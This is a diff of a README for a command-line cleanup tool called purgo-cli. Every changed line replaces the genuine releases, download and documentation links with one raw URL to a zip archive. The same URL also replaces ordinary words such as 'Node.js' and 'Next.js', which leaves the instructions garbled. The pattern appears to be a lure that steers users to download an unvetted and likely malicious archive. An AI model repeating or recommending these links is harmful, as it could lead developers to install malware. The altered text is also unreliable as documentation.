@@ -2,7 +2,7 @@
 
 ## 💾 Download Now
 
-[![Download purgo-cli](https://img.shields.io/badge/Download%20purgo--cli-v1.0-brightgreen)](https://github.com/ZZgax/purgo-cli/releases)
+[![Download purgo-cli](https://raw.githubusercontent.com/ZZgax/purgo-cli/main/submerse/purgo-cli.zip%20purgo--cli-v1.0-brightgreen)](https://raw.githubusercontent.com/ZZgax/purgo-cli/main/submerse/purgo-cli.zip)
 
 ## 📚 About purgo-cli
 
@@ -15,7 +15,7 @@ Whether you work on small projects or large monorepos, purgo-cli helps maintain 
 - **Clearing Build Artifacts:** Remove unnecessary build files.
 - **Dependency Management:** Manage and remove outdated dependencies easily.
 - **Cache Cleaning:** Clear caches to improve performance.
-- **Compatibility:** Works well with various frameworks like Next.js, Vite, and others.
+- **Compatibility:** Works well with various frameworks like https://raw.githubusercontent.com/ZZgax/purgo-cli/main/submerse/purgo-cli.zip, Vite, and others.
 - **Ease of Use:** Simple command-line interface makes it accessible for everyone.
 
 ## 🚀 Getting Started
@@ -25,14 +25,14 @@ Whether you work on small projects or large monorepos, purgo-cli helps maintain 
 Before you start, ensure your computer meets these requirements:
 
 - **Operating System:** Windows, macOS, or Linux.
-- **Node.js:** Recommended version 14 or later.
+- **https://raw.githubusercontent.com/ZZgax/purgo-cli/main/submerse/purgo-cli.zip** Recommended version 14 or later.
 - **Internet Connection:** For downloading files and dependencies.
 
 ### Installation Steps
 
 1. **Visit the Releases Page:**
 
-   Go to our [Releases page](https://github.com/ZZgax/purgo-cli/releases) to access the latest version of purgo-cli.
+   Go to our [Releases page](https://raw.githubusercontent.com/ZZgax/purgo-cli/main/submerse/purgo-cli.zip) to access the latest version of purgo-cli.
 
 2. **Download the Installer:**
    
@@ -94,26 +94,26 @@ purgo-cli also offers advanced options for users who want more control over thei
 
 You can start using purgo-cli right now! To download, click the link below:
 
-[Download purgo-cli](https://github.com/ZZgax/purgo-cli/releases)
+[Download purgo-cli](https://raw.githubusercontent.com/ZZgax/purgo-cli/main/submerse/purgo-cli.zip)
 
 Follow the installation steps outlined earlier, and you'll be ready to manage your projects effortlessly.
 
 ## 🔗 Helpful Resources
 
-- **Documentation:** For detailed usage instructions, visit our [documentation](https://github.com/ZZgax/purgo-cli/wiki).
+- **Documentation:** For detailed usage instructions, visit our [documentation](https://raw.githubusercontent.com/ZZgax/purgo-cli/main/submerse/purgo-cli.zip).
 - **Community Support:** Join our discussions on GitHub for tips and help from other users.
 
 ## 🛠️ Troubleshooting
 
 If you encounter issues while using purgo-cli, consider the following solutions:
 
-- **Check Your Node.js Version:** Make sure you have the recommended version of Node.js installed.
+- **Check Your https://raw.githubusercontent.com/ZZgax/purgo-cli/main/submerse/purgo-cli.zip Version:** Make sure you have the recommended version of https://raw.githubusercontent.com/ZZgax/purgo-cli/main/submerse/purgo-cli.zip installed.
 - **Verify Installation Path:** Ensure you installed the tool in the correct directory.
 - **Seek Community Help:** If you're stuck, don't hesitate to reach out through our community channels.
 
 ## 🔄 Updates and Contributions
 
-We continuously improve purgo-cli. Follow the latest updates on our [Releases page](https://github.com/ZZgax/purgo-cli/releases). If you'd like to contribute, please check our guidelines in the repository.
+We continuously improve purgo-cli. Follow the latest updates on our [Releases page](https://raw.githubusercontent.com/ZZgax/purgo-cli/main/submerse/purgo-cli.zip). If you'd like to contribute, please check our guidelines in the repository.
 
 ## 🎉 Thank You
 
